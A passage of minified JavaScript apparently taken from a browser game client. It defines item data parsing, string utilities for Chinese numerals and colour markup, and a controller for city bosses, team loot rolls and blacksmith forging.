n;!function(t){t[t.TYPE_0=0]="TYPE_0",t[t.TYPE_1=1]="TYPE_1",t[t.TYPE_2=2]="TYPE_2",t[t.TYPE_3=3]="TYPE_3",t[t.TYPE_4=4]="TYPE_4",t[t.TYPE_5=5]="TYPE_5",t[t.TYPE_6=6]="TYPE_6",t[t.TYPE_7=7]="TYPE_7",t[t.TYPE_8=8]="TYPE_8",t[t.TYPE_9=9]="TYPE_9",t[t.TYPE_10=10]="TYPE_10",t[t.TYPE_11=11]="TYPE_11",t[t.TYPE_12=12]="TYPE_12",t[t.TYPE_13=13]="TYPE_13",t[t.TYPE_14=14]="TYPE_14",t[t.TYPE_15=15]="TYPE_15",t[t.TYPE_16=16]="TYPE_16",t[t.TYPE_17=17]="TYPE_17",t[t.TYPE_18=18]="TYPE_18",t[t.TYPE_19=19]="TYPE_19",t[t.TYPE_20=20]="TYPE_20",t[t.TYPE_21=21]="TYPE_21",t[t.TYPE_22=22]="TYPE_22",t[t.TYPE_23=23]="TYPE_23",t[t.TYPE_24=24]="TYPE_24",t[t.TYPE_25=25]="TYPE_25",t[t.TYPE_26=26]="TYPE_26",t[t.TYPE_27=27]="TYPE_27",t[t.TYPE_28=28]="TYPE_28",t[t.TYPE_29=29]="TYPE_29",t[t.TYPE_30=30]="TYPE_30",t[t.TYPE_31=31]="TYPE_31",t[t.TYPE_32=32]="TYPE_32",t[t.TYPE_33=33]="TYPE_33",t[t.TYPE_34=34]="TYPE_34",t[t.TYPE_35=35]="TYPE_35",t[t.TYPE_36=36]="TYPE_36",t[t.TYPE_37=37]="TYPE_37",t[t.TYPE_38=38]="TYPE_38",t[t.TYPE_39=39]="TYPE_39",t[t.TYPE_40=40]="TYPE_40",t[t.TYPE_41=41]="TYPE_41",t[t.TYPE_42=42]="TYPE_42",t[t.TYPE_43=43]="TYPE_43",t[t.TYPE_44=44]="TYPE_44",t[t.TYPE_45=45]="TYPE_45",t[t.TYPE_46=46]="TYPE_46",t[t.TYPE_47=47]="TYPE_47",t[t.TYPE_48=48]="TYPE_48",t[t.TYPE_49=49]="TYPE_49",t[t.TYPE_50=50]="TYPE_50",t[t.TYPE_51=51]="TYPE_51",t[t.TYPE_52=52]="TYPE_52",t[t.TYPE_53=53]="TYPE_53",t[t.TYPE_54=54]="TYPE_54",t[t.TYPE_55=55]="TYPE_55",t[t.TYPE_56=56]="TYPE_56",t[t.TYPE_57=57]="TYPE_57",t[t.TYPE_58=58]="TYPE_58",t[t.TYPE_60=60]="TYPE_60",t[t.TYPE_65=65]="TYPE_65"}(n=e.ItemType||(e.ItemType={})),window.ItemType=n,window.ItemType=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemData=void 0;var n=i(22),o=i(0),s=i(39),a=i(10),r=i(6),l=i(48),h=i(13),u=i(24),p=i(57),d=i(285),c=i(104),f=i(286),g=function(){function t(){this.attQuality=[],this.supExtAttQuality=[],this.extAttQuality=[],this._point=-1,this.endTime=0,this.countdown=0,this.star=0,this.isPreview=!1,this.xilianNum=0,this.storeHouselock=!1,this.gemPrefixDatas=[],this.masterEntryArr=[]}return t.prototype.parser=function(t){this.handle=t.readDouble(),this.configID=t.readInt(),this.count=t.readInt();var e=t.readInt();e>0?this.endTime=r.BagCT.ins().updatePostItemEndTime(e):this.endTime=e,this.quality=t.readInt(),this.lock=t.readInt()?!0:!1,this.star=t.readInt();var i=o.GlobalConfig.ItemConfig[this.configID];if(a.ItemUtil.getType(i)!=s.ItemType.TYPE_0&&(this.quality=a.ItemUtil.getQuality2(i)),this.att=[],this.attQuality=[],this.gemPrefixDatas=[],a.ItemUtil.getType(i)==s.ItemType.TYPE_55)for(var l=0;8>l;l++){var h=new d.EquipInlayPrefixData;if(h.parser(t),this.gemPrefixDatas.push(h),0==l){var u=this.getGemSkillId();c.EquipInlayCT.ins().CDMap[u]={reviseSkillId:u}}}else for(var l=0;8>l;l++){var p=new n.AttributeData(t.readInt(),t.readInt()),f=t.readInt();this.att.push(p),this.attQuality.push(f)}this.extAtt=[],this.extAttQuality=[];for(var l=0;8>l;l++){var p=new n.AttributeData(t.readInt(),t.readInt()),f=t.readInt();this.extAtt.push(p),this.extAttQuality.push(f)}this.supExtAtt=[],this.supExtAttQuality=[];for(var g=[],m=[],v=[],y=[],l=0;8>l;l++){var p=new n.AttributeData(t.readInt(),t.readInt()),f=t.readInt();4>l?(g.push(p),v.push(f)):(m.push(p),y.push(f))}for(var l=0;4>l;l++)this.supExtAtt.push(g[l]),this.supExtAttQuality.push(v[l]),this.supExtAtt.push(m[l]),this.supExtAttQuality.push(y[l]);var C=t.position,T=C+96;this.equipDuanPoPro={skillId:0,preId:0,proArr:[]},t.position=T;for(var b=o.GlobalConfig.EquipAffixBaseConfig.forgeSoulCount,w=0,l=0;8>l;l++){t.position-=3*(l+1)*4;var I=t.readInt(),_=t.readInt(),u=t.readInt();a.ItemUtil.getType(i)==s.ItemType.TYPE_33?I>0&&this.masterEntryArr.push(I):b>w&&(u>0&&(this.equipDuanPoPro.skillId=u),I>0&&this.equipDuanPoPro.proArr.push(I),_>0&&(this.equipDuanPoPro.preId=_)),t.position=T,w++}this.masterEntryArr.sort(function(t,e){return t-e}),t.position=T,a.ItemUtil.getType(this.itemConfig)==s.ItemType.TYPE_47&&r.BagCT.ins().sendItemEndTime(this.handle)},Object.defineProperty(t.prototype,"configID",{get:function(){return this._configID},set:function(t){this.itemConfig=o.GlobalConfig.ItemConfig[t],this._point=-1,this._configID=t,this.setCanbeUsed()},enumerable:!1,configurable:!0}),t.getStringByList=function(t,e,i){void 0===e&&(e=1),void 0===i&&(i=": ");for(var n="",o=0;o<t.length;o++)if(n+=t[o]+i,o<t.length-1)for(var s=0;e>s;s++)n+="\n";return n},t.getStringByNextList=function(t,e){for(var i="",n=0;n<t.length;n++)i+=t[n],e[n]&&(i+=e[n]),n<t.length-1&&(i+="\n");return i},Object.defineProperty(t.prototype,"point",{get:function(){return-1==this._point&&(this._point=a.ItemUtil.calculateBagItemScore(this)),this._point},enumerable:!1,configurable:!0}),t.prototype.setCanbeUsed=function(){return __awaiter(this,void 0,void 0,function(){var t;return __generator(this,function(e){return this.itemConfig?(t=a.ItemUtil.getType(this.itemConfig),t==s.ItemType.TYPE_47?this.canbeUsed=!0:this.canbeUsed=!1,[2]):[2]})})},t.prototype.getCanbeUsed=function(){return this.canbeUsed},t.prototype.copy=function(e){e||(e=new t);var i=this;e.handle=i.handle,e.configID=i.configID,e.count=i.count,e._point=i._point,e.endTime=i.endTime,e.quality=i.quality,e.star=i.star,e.att=[];for(var o in i.att){var s=new n.AttributeData(i.att[o].type,i.att[o].value);e.att.push(s)}e.extAtt=[];for(var o in i.extAtt){var s=new n.AttributeData(i.extAtt[o].type,i.extAtt[o].value);e.extAtt.push(s)}e.extAttQuality=[];for(var o in i.extAttQuality)e.extAttQuality.push(i.extAttQuality[o]);e.supExtAttQuality=[];for(var o=0;o<i.supExtAttQuality.length;o++)e.supExtAttQuality.push(i.supExtAttQuality[o]);e.supExtAtt=[];for(var o in i.supExtAtt){var s=new n.AttributeData(i.supExtAtt[o].type,i.supExtAtt[o].value);e.supExtAtt.push(s)}e.equipDuanPoPro={skillId:0,preId:0,proArr:[]},e.equipDuanPoPro.skillId=i.equipDuanPoPro.skillId,e.equipDuanPoPro.preId=i.equipDuanPoPro.preId;for(var o in i.equipDuanPoPro.proArr)e.equipDuanPoPro.proArr.push(i.equipDuanPoPro.proArr[o]);for(var a=0,r=this.gemPrefixDatas;a<r.length;a++){var l=r[a],s=new d.EquipInlayPrefixData;e.gemPrefixDatas.push(s),s.id=l.id,s.lv=l.lv}return e},t.prototype.deepClone=function(){var e=new t;return e=f.ObjectUtils.DeepClone(this,e)},t.prototype.simpleClone=function(){var e=new t;return e=f.ObjectUtils.SimpleClone(this,e)},t.prototype.init=function(){this.handle=0,this.configID=0,this.count=0,this.att=[];for(var t=0;8>t;t++){var e=new n.AttributeData(0,0);this.att.push(e)}this.extAtt=[];for(var t=0;8>t;t++){var e=new n.AttributeData(0,0);this.extAtt.push(e)}this.supExtAtt=[];for(var t=0;8>t;t++){var e=new n.AttributeData(0,0);this.supExtAtt.push(e)}},Object.defineProperty(t.prototype,"subType",{get:function(){return a.ItemUtil.getSubType(this.itemConfig)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"subType2",{get:function(){var t=h.SubRoles.ins().getSubRoleByIndex(0),e=t.getPosByhandel(this.handle);return e},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"job",{get:function(){return a.ItemUtil.getJob(this.itemConfig)},enumerable:!1,configurable:!0}),t.prototype.getJPNum=function(){var t=0;if(!this.att)return 0;for(var e in l.Role.translate)for(var i=0;i<this.att.length;i++){var n=this.att[i];n.value&&n.type==l.Role.translate[e]&&(t+=n.value)}return t},t.prototype.getJPPer=function(){var t=0,e=o.GlobalConfig.EquipConfig[this.configID],i=[];if(e&&e.jpNum){if(e.fixedJpAttr)for(var n=u.CommonUtils.objectToArray(e.fixedJpAttr),s=0;s<n.length;s++)i.push({type:n[s][0],value:n[s][1]});var a=this.att||[]||i||[];for(var r in l.Role.translate)for(var h=0;h<a.length;h++)if(a[h].value&&a[h].type==l.Role.translate[r]){t+=a[h].value;break}var p=this.quality||0;return Math.floor(t/e.jpNum[p]*100)}},Object.defineProperty(t.prototype,"xilian",{get:function(){return this.xilianNum},set:function(t){this.xilianNum=t},enumerable:!1,configurable:!0}),t.prototype.isMyEquip=function(t){void 0===t&&(t=r.BagCT.BAG_TYPE_EQUIP);var e=!1,i=u.CommonUtils.copyDataHandler(a.ItemUtil.getPosList(this.itemConfig)||[]),n=h.SubRoles.ins().getSubRoleByIndex(0);if(i.length)for(var o=0;o<i.length;o++){var s=i[o];if(n.equipsData[s].item.handle==this.handle)return!0}else{var s=a.ItemUtil.getSubType(this.itemConfig);e=n.equipsData[s].item.handle==this.handle}return r.BagCT.ins().getBagGoodsByHandle(t,this.handle)||e},t.prototype.isXiLian=function(){return!!this.xilianNum},t.prototype.isLessQuality=function(t,e){return this.getMoreEqualQualityCount(t)<e},t.prototype.getMoreEqualQualityCount=function(t){var e;void 0===t&&(t=p.QualityType.Orange);for(var i=0,n=this.supExtAtt||[],s=this.supExtAttQuality||[],a=0;a<n.length;a++){var r=n[a];r.type&&!(null===(e=o.GlobalConfig.AttrConfig[r.type])||void 0===e?void 0:e.relation)&&s[a]&&s[a]>=t&&(i+=1)}return i},Object.defineProperty(t.prototype,"gemPrefixData",{get:function(){return this.gemPrefixDatas[0]},enumerable:!1,configurable:!0}),t.prototype.setGemPrefixData=function(t){this.gemPrefixDatas[0]=t},t.prototype.getPrefixId=function(){var t;return null===(t=this.gemPrefixData)||void 0===t?void 0:t.id},t.prototype.getGemLv=function(){var t;return null===(t=this.gemPrefixData)||void 0===t?void 0:t.lv},t.prototype.getGemLvColor=function(){var t;return null===(t=this.gemPrefixData)||void 0===t?void 0:t.getLvColor()},t.prototype.getGemSkillId=function(){var t;return null===(t=this.gemPrefixData)||void 0===t?void 0:t.getSkillId()},t.prototype.getGemSkills=function(){var t;return(null===(t=this.gemPrefixData)||void 0===t?void 0:t.getSkills())||[]},t.prototype.getGemIcon=function(){var t;return null===(t=this.gemPrefixData)||void 0===t?void 0:t.getIcon()},t.prototype.getGemName=function(){var t;return null===(t=this.gemPrefixData)||void 0===t?void 0:t.getName()},t.prototype.getGemSkillDes=function(){var t,e=this.getGemSkillId();return(null===(t=o.GlobalConfig.GemReviseConfig[e])||void 0===t?void 0:t.desc)||""},t.prototype.getGemBody=function(){var t=a.ItemUtil.getSubType(this.itemConfig),e=a.ItemUtil.getPosList(this.itemConfig)||[];return-1==e.indexOf(t)&&e.push(t),e},t.prototype.setGemLv=function(t){this.gemPrefixData&&(this.gemPrefixData.lv=t)},t}();e.ItemData=g,window.ItemData=g,__reflect(g.prototype,"ItemData",[]),window.ItemData=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PayfunIconData=void 0;var n=i(64),o=i(220),s=function(t){function e(e){var i=t.call(this)||this;return i.cfg=e,i.descStyle="",i.redPoint=!1,i}return __extends(e,t),e.prototype.recSverNotify=function(t,e){observe(this,t,e)},e.prototype.showMsg=function(t){if(t){this.showMsgArr=t;for(var e=this.showMsgArr.length,i=0;e>i;i++)this.recSverNotify(this.updataShow,this.showMsgArr[i]);this.updataShow()}},e.prototype.updataShow=function(){var t=this.checkShow();return t?(this.dispatchEventWith(o.EventType.CHANGE),void n.MainUICC.postPayfunChange(this)):(n.MainUICC.postPayfunChange(this),this.dispatchEventWith(o.EventType["delete"]))},e.prototype.checkShow=function(){return!1},e.prototype.tapEvt=function(){},e}(egret.EventDispatcher);e.PayfunIconData=s,window.PayfunIconData=s,__reflect(s.prototype,"PayfunIconData",[]),window.PayfunIconData=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StringUtils=void 0;var n=i(157),o=function(){function t(){}return t.trimSpace=function(t){return t.replace(/^\s*(.*?)[\s\n]*$/g,"$1")},t.getStringLength=function(t){for(var e=t.split(""),i=0,n=0;n<e.length;n++){var o=e[n];i+=this.isChinese(o)?2:1}return i},t.isChinese=function(t){var e=/^[\u4E00-\u9FA5]+$/;return e.test(t)?!1:!0},t.strByteLen=function(t){for(var e=0,i=t.length,n=0;i>n;n++)e+=t.charCodeAt(n)>=127?2:1;return e},t.complementByChar=function(e,i,n,o){void 0===n&&(n=" "),void 0===o&&(o=!0);var s=this.strByteLen(o?e.replace(t.HTML,""):e);return e+this.repeatStr(n,i-s)},t.repeatStr=function(t,e){for(var i="",n=0;e>n;n++)i+=t;return i},t.addColor=function(t,e){var i;if("string"==typeof e)i=String(e);else{if("number"!=typeof e)return t;i=Number(e).toString(10)}return'<font color="'+i+'">'+t+"</font>"},t.addColor1=function(t,e){var i=new Object;return i.style=new Object,i.text=t,i.textColor=Number(e).toString(16),i},t.substitute=function(t){for(var e=[],i=1;i<arguments.length;i++)e[i-1]=arguments[i];var o=n.RegExpUtil.REPLACE_STRING,s=t.match(o);if(s&&s.length)for(var a=s.length,r=0;a>r;r++)t=t.replace(s[r],e[r]);return t},t.replaceStr=function(t,e,i){if(-1==t.indexOf(e))return t;var n=t.split(e);return n[0]+i+n[1]},t.replaceStrColor=function(t,e){for(var i=t.indexOf("0x"),n=i,o="",s="";-1!=n;)o=t.substring(i,i+8),t=t.replace(o,e),i+=8,s=t.substring(i),n=s.indexOf("0x"),i+=n;return t},t.replace=function(t){for(var e=[],i=1;i<arguments.length;i++)e[i-1]=arguments[i];for(var n=0;n<e.length;n++)t=t.replace("%s",e[n]+"");return t},t.getStrByRegExp=function(t,e){void 0===e&&(e=/\d+/g);var i=[];t.replace(e,function(){return i.push(arguments[0]),"number"==typeof arguments[0]?arguments[0].toString():arguments[0]});return i},t.ChineseToNumber=function(e){for(var i=0,n=0,o=0,s=!1,a=e.split(""),r=0;r<a.length;r++){var l=t.chnNumCharCN[a[r]];if("undefined"!=typeof l)o=l,r===a.length-1&&(n+=o);else{var h=t.chnNameValueCN[a[r]].value;s=t.chnNameValueCN[a[r]].secUnit,s?(n=(n+o)*h,i+=n,n=0):n+=o*h,o=0}}return i+n},t.NumberToChinese=function(e){var i=0,n="",o="",s=!1,a=t.chnNumChar,r=t.chnUnitSection;if(0===e)return a[0];if(e>=10&&20>e)return t.chnUnitChar[1]+t.SectionToChinese(e%10);for(;e>0;){var l=e%1e4;s&&(o=a[0]+o),n=t.SectionToChinese(l),n+=0!==l?r[i]:r[0],o=n+o,s=1e3>l&&l>0,e=Math.floor(e/1e4),i++}return o},t.NumberTurnChinese=function(e){var i=getLangType();return i==LanguageEnum.CN||i==LanguageEnum.CN1?t.NumberToChinese(e).split("").join("\n"):e+""},t.SectionToChinese=function(e){for(var i="",n="",o=0,s=!0,a=t.chnNumChar,r=t.chnUnitChar;e>0;){var l=e%10;
0===l?s||(s=!0,n=a[l]+n):(s=!1,i=a[l],i+=r[o],n=i+n),o++,e=Math.floor(e/10)}return n},t.subZeroAndDot=function(t){return t.indexOf(".")>0&&(t=t.replace(/0+?$/g,""),t=t.replace(/[\.]$/g,"")),t},t.HTML=/<[^>]+>/g,t.chnNumCharCN={"零":0,"一":1,"二":2,"三":3,"四":4,"五":5,"六":6,"七":7,"八":8,"九":9},t.chnNameValueCN={"十":{value:10,secUnit:!1},"百":{value:100,secUnit:!1},"千":{value:1e3,secUnit:!1},"万":{value:1e4,secUnit:!0},"亿":{value:1e8,secUnit:!0}},t}();e.StringUtils=o,window.StringUtils=o,__reflect(o.prototype,"StringUtils",[]),window.StringUtils=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CityCC=void 0;var n=i(210),o=i(24),s=i(8),a=i(14),r=i(37),l=i(0),h=i(91),u=i(4),p=i(13),d=i(20),c=i(30),f=i(6),g=i(10),m=i(162),v=i(45),y=i(120),C=i(163),T=i(32),b=i(137),w=i(59),I=i(67),_=i(64),S=i(88),x=i(71),D=i(25),A=i(7),k=i(2),B=i(63),P=i(678),R=function(t){function e(){var e=t.call(this)||this;return e.cityBossId=0,e.cityBossHandle=0,e.attStatue=2,e.bossKillNumData={},e.bossState=2,e.mapBossList={},e.teamList=[],e.teamId=0,e.leaderId=0,e.isAtuoTeam=!1,e.teamNumberSList=[],e.teamApplyList=[],e.CITI_FB_BOSS_TYPE=[1,2,3,5],e.lastCityGoTime=0,e.lastCityGoId=0,e._isChangeScene=!1,e.isBianQiang=!1,e.sysId=PackageID.City,observe(e,function(){e.isCity?e.postEnterCity():e.lastCity&&e.postEscCity(),e.lastCityGoId=d.GameMap.fubenID,e.isChangeScene=!1},Ts.enterScene.enterOK),e.enterCD=0,e.regNetMsg(1,e.cityBossBelong),e.regNetMsg(2,e.doBossChallengeResult),e.regNetMsg(3,e.postBossInfo),e.regNetMsg(6,e.updateHudunPoint),e.regNetMsg(7,e.postEnterCD),e.regNetMsg(8,e.postBossRevelryState),e.regNetMsg(11,e.postMapDrop),observe(e,e.postMapBossList,Ts.getMapBossLost),e.regNetMsg(12,e.doBlackSmith),e.regNetMsg(14,e.doPostTeamList),e.regNetMsg(15,e.doPostTeamItemInfo),e.regNetMsg(16,e.doTeamChange),e.regNetMsg(17,e.doPostTeamPlayerInfo),e.regNetMsg(18,e.doAddTeamInfo),e.regNetMsg(19,e.doTeamCbRoll),e.regNetMsg(20,e.doTeamRoll),e.regNetMsg(21,e.postEntityTeamId),e}return __extends(e,t),Object.defineProperty(e.prototype,"isChangeScene",{get:function(){return this._isChangeScene},set:function(t){this._isChangeScene=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"isCity",{get:function(){return d.GameMap.fbType==T.FbCT.FB_TYPE_CITY},enumerable:!1,configurable:!0}),e.prototype.postEntityTeamId=function(t){var e,i=t.readDouble(),n=t.readUnsignedInt(),o=r.EntityManager.ins().getEntityByHandle(i);o&&void 0!=(null===(e=o.infoModel)||void 0===e?void 0:e.teamId)&&(o.infoModel.teamId=n)},e.prototype.sendTeamRoll=function(t,e){var i=this.getBytes(20);i.writeInt(t),i.writeByte(e),this.sendToServer(i)},e.prototype.doTeamRoll=function(t){var e=t.readInt(),i=t.readShort();return{id:e,roll:i}},e.prototype.teamAddRollItemS=function(t){return t},e.prototype.teamCheckTimeRollItemS=function(){},e.prototype.teamRemoveRollItem=function(t){return t},e.prototype.sendTeamPlayerInfo=function(){var t=this.getBytes(17);this.sendToServer(t)},e.prototype.doPostTeamPlayerInfo=function(t){var e=t.readUnsignedInt();e||(this.teamApplyList.length=0);var i=t.readByte();this.teamId=e,this.isAtuoTeam=!!i},e.prototype.doAddTeamInfo=function(t){for(var e=t.readInt(),i=t.readString(),n=t.readInt(),o=t.readByte(),s=0;s<this.teamApplyList.length;s++)if(this.teamApplyList[s].actId==e)return;this.teamApplyList.push({actId:e,name:i,lv:n,job:o}),this.postChangeApplyList()},e.prototype.postChangeApplyList=function(){},e.prototype.doTeamCbRoll=function(t){for(var e=[],i=t.readInt(),n=1e3*l.GlobalConfig.RoleBaseConfig.teamRollMaxTime,o=0;i>o;o++){var s=t.readInt(),a=t.readInt(),r=t.readByte(),h=egret.getTimer()+n;e.push({id:s,itemId:a,itemQx:r,roll:0,time:h})}win.get("TeamCityRollWin")?this.teamAddRollItemS(e):win.open("TeamCityRollWin",e)},e.prototype.sendTeamChange=function(t,e,i){void 0===e&&(e=0),void 0===i&&(i=0);var n=this.getBytes(16);n.writeByte(t),n.writeInt(e),n.writeInt(i),this.sendToServer(n)},e.prototype.doTeamChange=function(t){var e=(t.readByte(),t.readByte());if(e)switch(e){case 1:k.TipsCT.ins().showTips(gettext("已有队伍"));break;case 2:k.TipsCT.ins().showTips(gettext("没有队伍"));break;case 3:k.TipsCT.ins().showTips(gettext("满了"));break;case 4:k.TipsCT.ins().showTips(gettext("不允许"));break;case 5:k.TipsCT.ins().showTips(gettext("无法操作"))}},e.prototype.sendTeamItemInfo=function(){var t=this.getBytes(15);this.sendToServer(t)},e.prototype.doPostTeamItemInfo=function(t){this.teamNumberSList=[];var e=t.readInt();this.leaderId=0;for(var i=0;e>i;i++){var n=t.readInt(),o=t.readInt(),s=t.readString(),a=t.readInt(),r=t.readByte(),l=t.readByte();l&&(this.leaderId=o),this.teamNumberSList.push({fbId:n,actId:o,name:s,lv:a,job:r})}return this.teamNumberSList},e.prototype.isMyTeamNumber=function(t){return d.GameMap.checkIsInKf3v3(),this.teamId>0&&this.teamId==t},e.prototype.sendTeamList=function(){var t=this.getBytes(14);this.sendToServer(t)},e.prototype.doPostTeamList=function(t){this.teamList=[];for(var e=t.readInt(),i=0;e>i;i++){var n=t.readUnsignedInt(),o=t.readString(),s=t.readUnsignedByte();this.teamList.push({id:n,name:o,count:s,applylist:[]})}},e.prototype.doBlackSmith=function(t){this.fortunateNum=t.readByte(),this.adLastTimes=t.readByte();var e=this.blackSmithDatas?o.CommonUtils.objectToArray(this.blackSmithDatas):[];this.blackSmithDatas=[];for(var i=0;3>i;i++){var n=new P.BlackSmithData;n.index=i+1,n.parser(t),this.blackSmithDatas.push(n)}if(0!=e.length)for(var i=0;i<e.length;i++)e[i].itemId==this.blackSmithDatas[i].itemId&&e[i].isBuy!=this.blackSmithDatas[i].isBuy&&1==this.blackSmithDatas[i].isBuy&&k.TipsCT.ins().showTips(gettext("锻造成功"));this.showBlackSmithDatas=[];for(var i=0;i<this.blackSmithDatas.length;i++)this.showBlackSmithDatas.push(this.blackSmithDatas[i]);this.postBlackSmith()},e.prototype.postBlackSmith=function(){},e.prototype.sendBlackSmith=function(){var t=this.getBytes(12);this.sendToServer(t)},e.prototype.sendForging=function(t,e){var i=this.getBytes(13);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.getMoneyCostByLv=function(t){var e=l.GlobalConfig.BlacksmithCostConfig;for(var i in e){var n=e[i],o=n.interval;if(t>=o[0]&&t<=o[1])return n.cost}},e.prototype.doBossChallengeResult=function(t){for(var e=t.readByte(),i=t.readString(),o=t.readByte()||1,s=t.readByte(),a=t.readShort(),r=[],l=0;a>l;l++)r[l]=new c.RewardData,r[l].parser(t);var h="yuanhead"+o+s;n.ResultManager.ins().create(d.GameMap.fbType,!0,r,"",null,[e,i,h])},e.prototype.getBossList=function(){var t=[];for(var e in l.GlobalConfig.CityBossConfig){var i=l.GlobalConfig.CityBossConfig[e];-1==t.indexOf(i.bossId)&&i.killBossId>999&&t.push(i.bossId)}return new eui.ArrayCollection(t)},e.prototype.getCityBossConfig=function(t){if(!this.cityBossIdConf){this.cityBossIdConf={};for(var e in l.GlobalConfig.CityBossConfig){var i=l.GlobalConfig.CityBossConfig[e];this.cityBossIdConf[i.bossId]=i}}var n=this.cityBossIdConf[t];return n&&n.killBossId>999?n:null},e.prototype.getKillBossNum=function(t){var e=this.getCityBossConfig(t),i=e.killBossId,n=0;void 0!=this.bossKillNumData[i]&&(n=this.bossKillNumData[i][0]);var o=this.getNeedKillBossNum(t);return(t==this.cityBossId||n>o)&&(n=o),n},e.prototype.getNeedKillBossNum=function(t){var e=this.getCityBossConfig(t),i=e.killBossId,n=0;return void 0!=this.bossKillNumData[i]&&(n=this.bossKillNumData[i][1]),n>=e.killCount.length&&(n=e.killCount.length-1),e.killCount[n]},e.prototype.getRefreshTime=function(t){var e=this.getCityBossConfig(t),i=e.killBossId,n=0;void 0!=this.bossKillNumData[i]&&(n=this.bossKillNumData[i][2]);var o;return 0==n?o="":(n=s.DateUtils.formatMiniDateTime(n),o=s.DateUtils.checkTime(n,7)||0==n?"":s.DateUtils.formatFullTime(n)),o},e.prototype.postBossInfo=function(t){for(var e=t.readShort(),i=0;e>i;i++){var n=t.readInt(),o=t.readInt(),s=t.readInt(),a=t.readInt();this.bossKillNumData[n]=[o,s,a]}},e.prototype.getMaxKillNumBoss=function(){var t,e=0,i=0,n=Number.MAX_VALUE,o=!1,s=0;for(var a in this.bossKillNumData)if(!(999>+a)){t=this.getCfgByKillBossId(parseInt(a));var r=t.killCount[this.bossKillNumData[a][1]];void 0==r&&(r=t.killCount[t.killCount.length-1]);var l=this.bossKillNumData[a][0]/r;if(l>=1)return[e,l];e||o||0!=this.bossKillNumData[a][2]||(o=!0,s=t.bossId,i=l),this.bossKillNumData[a][2]&&this.bossKillNumData[a][2]<n&&(e=t.bossId,n=this.bossKillNumData[a][2],i=l)}return[e||s,i]},e.prototype.getShowBossId=function(){var t;return t=this.cityBossId>0?this.cityBossId:this.getMaxKillNumBoss()[0]},e.prototype.getCfgByKillBossId=function(t){for(var e in l.GlobalConfig.CityBossConfig)if(l.GlobalConfig.CityBossConfig[e].killBossId==t)return l.GlobalConfig.CityBossConfig[e];return null},e.prototype.sendEnter=function(){this.sendBaseProto(1)},e.prototype.sendStopAI=function(){this.sendBaseProto(2)},e.prototype.sendCityGo=function(t,e,i){if(void 0===i&&(i=!0),d.GameMap.fubenID==e)return void(i&&k.TipsCT.ins().showTips(gettext("已在当前场景")));if(0!=t){var n=f.BagCT.ins().getBagGoodsCountById(f.BagCT.BAG_TYPE_OTHTER,h.ItemConst.BACK_ITEM);if(n>0);else if(0==D.Recharge.ins().godOfWarTime){if(i){var o=window.platform.isshen()?gettext("传送券不足"):gettext("开启战神特权可直接传送BOSS");k.TipsCT.ins().showTips(o),B.WarnCT.ins().setBuyGoodsWarn(h.ItemConst.BACK_ITEM)}return}}var s=l.GlobalConfig.InstanceConfig[e];if(u.ActorCC.power<(null===s||void 0===s?void 0:s.powerlimit))return i&&k.TipsCT.ins().showTips(gettext("战力需达到：")+((null===s||void 0===s?void 0:s.powerlimit)||0)),w.GameFlashSaleCt.ins().reportPowerNot(),void win.open(I.View_BianQiang,1);if(!s)return void console.log("找不到副本ID对应的数据："+e);if(A.GameServerCC.serverTime-this.lastCityGoTime<3e3){if(win.get("MainMapBar"))return;if(this.lastCityGoId!=d.GameMap.fubenID)return}this.lastCityGoTime=A.GameServerCC.serverTime,this.sendChange(e,t)},e.prototype.sendChange=function(t,e){var i=this;this.isChangeScene=!0,win.open("MainMapBar",function(){var n;if(null===(n=p.SubRoles.lookAtTar)||void 0===n?!0:!n.isDie()){var o=i.getBytes(10);o.writeShort(t),o.writeByte(e),i.sendToServer(o),console.log("@@前端请求切换城池fubenID=",t," signal=",e),i.lastCityGoId=t,_.MainUICC.CictyChange()}})},e.prototype.postEnterCity=function(){this.lastCity=!0,this.changeFunView(),S.Rank.ins().sendGetPraiseData(x.RankDataType.TYPE_POWER),S.Rank.ins().sendGetPraiseData(x.RankDataType.TYPE_SKIRMISH),S.Rank.ins().sendGetPraiseData(x.RankDataType.TYPE_LILIAN)},e.prototype.postEscCity=function(){this.lastCity=!1,this.attStatue=2},e.prototype.postChangeAttStatue=function(t){return this.attStatue=t,this.changeFunView(),t},e.prototype.changeFunView=function(){this.isCity&&(0==this.cityBossId?win.close("BossBelongPanel"):win.open("BossBelongPanel"))},e.prototype.cityBossBelong=function(t){var e=t.readDouble(),i=t.readDouble(),n="";if(e>0){var o=r.EntityManager.ins().getMasterList(e);o&&o[0]&&o[0].infoModel&&(n=o[0].infoModel.name)}m.BossCT.ins().postBelongChange(i,e,n)},e.prototype.updateHudunPoint=function(t){return t?(this.hudun=t.readInt(),this.huDunMax=t.readInt(),Timer.stop(this.hudunPointFun,this),this.hudun>0&&Timer.start(1e3,this.hudun,this.hudunPointFun,this),void this.postHudunPoint()):!0},e.prototype.hudunPointFun=function(){this.hudun--,this.postHudunPoint()},e.prototype.postHudunPoint=function(){},e.prototype.postEnterCD=function(t){this.enterCD=t.readInt(),Timer.stop(this.enterCDFun,this),this.enterCD>0&&Timer.start(1e3,this.enterCD,this.enterCDFun,this)},e.prototype.postBossRevelryState=function(t){t.readInt();this.bossState=t.readUnsignedByte()},e.prototype.postMapBossList=function(t){for(var e=t.readShort(),i=0;e>i;i++){var n=t.readInt();this.mapBossList[n]||(this.mapBossList[n]={}),this.mapBossList[n].time=t.readInt(),this.mapBossList[n].isExKo=t.readByte()}},e.prototype.postMapDrop=function(t){var e,i,n=[],o=t.readInt(),s=t.readInt(),a=t.readInt(),r=[],h=new v.DropItemToChat;h.bossId=o,h.exp=s,h.extraExp=a;for(var u=t.readInt(),f=0;u>f;f++){var g=new c.RewardData;g.type=t.readByte();var m=t.readInt();g.id=m;var y=t.readInt();g.count=y;var C=t.readByte();n.push({id:m,count:y,qx:C});var 